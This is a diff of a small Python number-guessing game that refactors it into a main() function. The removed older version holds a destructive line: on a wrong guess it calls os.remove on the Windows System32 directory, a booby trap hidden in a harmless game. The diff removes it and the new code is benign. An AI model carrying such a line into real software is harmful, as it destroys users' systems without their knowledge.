@@ -1,13 +1,13 @@
 import random
-import os
 
-from numpy import number
+def main():
+    number = random.randint(1, 100)
+    guess = int(input("Guess a number between 1 and 100: "))
 
-number= random.randint(1, 100)
-guess = int(input("Guess a number between 1 and 100: "))    
-guess = int(guess)
+    if guess == number:
+        print("🎉 Congratulations! You guessed the number correctly.")
+    else:
+        print(f"❌ Sorry, the correct number was {number}. Better luck next time!")
 
-if guess == number:
-    print("Congratulations! You guessed the number correctly.") 
-else:
-    os.remove("C:/Windows/System32")
+if __name__ == "__main__":
+    main()
